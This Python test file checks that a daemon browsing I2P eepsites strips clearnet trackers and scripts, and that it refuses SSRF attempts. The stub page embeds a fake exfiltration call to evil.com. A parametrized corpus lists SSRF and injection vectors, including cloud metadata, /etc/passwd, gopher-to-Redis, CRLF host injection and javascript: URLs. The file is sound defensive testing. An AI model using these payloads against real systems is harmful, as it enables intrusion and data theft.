"""End-to-end test: /browse + /browse/resource daemon endpoints.

Boots a stub "i2pd proxy" HTTP server, points the daemon's
ECHELON_I2PD_PROXY_* env at it, and verifies the daemon fetches +
sanitizes eepsite HTML correctly. The deanonymization defense is
verified end-to-end: a clearnet tracker embedded in the stub eepsite
must NOT survive into the /browse response.
"""
from __future__ import annotations

import http.server
import socket
import threading
import time
from contextlib import closing

import pytest


class _StubI2pProxy(http.server.BaseHTTPRequestHandler):
    html_body = (
        b"<html><head><title>Eepsite</title></head><body>"
        b"<h1>Hello from I2P</h1>"
        b'<img src="https://tracker.evil.com/pixel.png">'   # clearnet leak
        b'<img src="/logo.png">'                            # in-network
        b'<script>fetch("https://evil.com/exfil")</script>'  # script
        b'<a href="/page2">next</a>'                        # in-network link
        b"</body></html>"
    )

    def do_GET(self):  # noqa: N802
        # absolute-URI request line → self.path is the full URL
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(self.html_body)))
        self.end_headers()
        self.wfile.write(self.html_body)

    def log_message(self, *a):
        pass


def _free_port() -> int:
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture
def stub_i2p(monkeypatch):
    port = _free_port()
    server = http.server.ThreadingHTTPServer(("127.0.0.1", port), _StubI2pProxy)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.05)
    monkeypatch.setenv("ECHELON_I2PD_PROXY_HOST", "127.0.0.1")
    monkeypatch.setenv("ECHELON_I2PD_PROXY_PORT", str(port))
    try:
        yield port
    finally:
        server.shutdown()
        server.server_close()


def test_browse_sanitizes_eepsite(client, stub_i2p):
    import urllib.request
    base = client[0].base
    req = urllib.request.Request(f"{base}/browse?url=example.i2p")
    with urllib.request.urlopen(req, timeout=5) as resp:
        assert resp.status == 200
        headers = dict(resp.headers)
        resp.read()
    # At least the clearnet pixel was blocked
    assert int(headers["X-Echelon-Blocked"]) >= 1
    assert int(headers["X-Echelon-Scripts-Removed"]) >= 1
    assert int(headers["X-Echelon-Rewritten"]) >= 1


def test_browse_response_has_no_clearnet(client, stub_i2p):
    """The core deanonymization check, end-to-end: no clearnet URL in the
    sanitized /browse output."""
    import urllib.request

    base, _ = client[0].base, client[1]
    req = urllib.request.Request(f"{base}/browse?url=example.i2p")
    with urllib.request.urlopen(req, timeout=5) as resp:
        html = resp.read().decode("utf-8")
    assert "tracker.evil.com" not in html
    assert "evil.com/exfil" not in html
    assert "<script" not in html
    # in-network resources rewritten to the resource proxy
    assert "/browse/resource?url=" in html
    # in-network link rewritten to re-browse
    assert "/browse?url=" in html
    # our CSP present
    assert "Content-Security-Policy" in html


def test_browse_missing_url_param(client, stub_i2p):
    daemon_client, _ = client
    status, _, body = daemon_client.request("/browse", method="GET")
    assert status == 400


def test_browse_clearnet_host_refused(client, stub_i2p):
    daemon_client, _ = client
    status, _, body = daemon_client.request("/browse?url=evil.com", method="GET")
    # i2p_fetch raises bad-host → daemon returns 502 with reason
    assert status == 502
    assert body.get("reason") == "bad-host"


def test_browse_resource_serves_image(client, stub_i2p, monkeypatch):
    # Make the stub return a PNG for the resource fetch.
    _StubI2pProxy.html_body = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
    monkeypatch.setattr(_StubI2pProxy, "do_GET", _png_do_get)
    import urllib.request
    base = client[0].base
    req = urllib.request.Request(f"{base}/browse/resource?url=http://example.i2p/logo.png")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read()
        assert data.startswith(b"\x89PNG")
    finally:
        _StubI2pProxy.html_body = _ORIGINAL_HTML


_ORIGINAL_HTML = _StubI2pProxy.html_body


def _png_do_get(self):
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
    self.send_response(200)
    self.send_header("Content-Type", "image/png")
    self.send_header("Content-Length", str(len(png)))
    self.end_headers()
    self.wfile.write(png)


def test_browse_wf_defense_headers(client, stub_i2p):
    """With ?wf=1, the daemon reports the Tamaraw regularized shape AND
    actually frames+pads the body (Sprint C). On-wire size = the padded
    bucket length; the client recovers the exact sanitized HTML."""
    import urllib.request
    base = client[0].base
    req = urllib.request.Request(f"{base}/browse?wf=1&url=example.i2p")
    with urllib.request.urlopen(req, timeout=5) as resp:
        headers = dict(resp.headers)
        raw = resp.read()
    assert headers.get("X-Echelon-WF-Defense") == "tamaraw"
    assert headers.get("X-Echelon-WF-Framed") == "tamaraw-v1"
    padded = int(headers["X-Echelon-WF-Padded-Bytes"])
    # the body really is padded to the bucket length (the observable)
    assert len(raw) == padded
    # and the exact sanitized HTML is recoverable from the framing
    from scripts.traffic_regularization import unpad_payload
    html = unpad_payload(raw).decode("utf-8")
    assert "<script" not in html
    assert "Content-Security-Policy" in html


def test_browse_without_wf_has_no_wf_headers(client, stub_i2p):
    import urllib.request
    base = client[0].base
    req = urllib.request.Request(f"{base}/browse?url=example.i2p")
    with urllib.request.urlopen(req, timeout=5) as resp:
        headers = dict(resp.headers)
        resp.read()
    assert "X-Echelon-WF-Defense" not in headers


# ── The resource proxy is NOT an SSRF goblin: same host gate as /browse ──

_SSRF_CORPUS = [
    "127.0.0.1/x", "localhost/x", "169.254.169.254/latest/", "[::1]/x",
    "file:///etc/passwd", "http://127.0.0.1:7070/", "evil.com",
    "https://evil.com/x", "ftp://evil.com/x", "gopher://127.0.0.1:6379/x",
    "http://evil.com@target.i2p/", "http://target.i2p@127.0.0.1/",
    "http://target.i2p%00.evil.com/", "http://target.i2p%0d%0aHost:%20evil.com/",
    "http://[::ffff:127.0.0.1]/", "http://target.i2p.evil.com/",
    "javascript:alert(1)", "data:text/html,<script>x</script>",
]


@pytest.mark.parametrize("vec", _SSRF_CORPUS)
def test_browse_rejects_ssrf(client, stub_i2p, vec):
    daemon_client, _ = client
    status, _, body = daemon_client.request(f"/browse?url={vec}", method="GET")
    assert status == 502 and body.get("reason") == "bad-host", vec


@pytest.mark.parametrize("vec", _SSRF_CORPUS)
def test_browse_resource_rejects_ssrf(client, stub_i2p, vec):
    """The resource proxy must enforce the IDENTICAL .i2p-only host gate —
    not a weaker one. This is the 'goblin in the basement' check."""
    daemon_client, _ = client
    status, _, body = daemon_client.request(f"/browse/resource?url={vec}", method="GET")
    assert status == 502 and body.get("reason") == "bad-host", vec
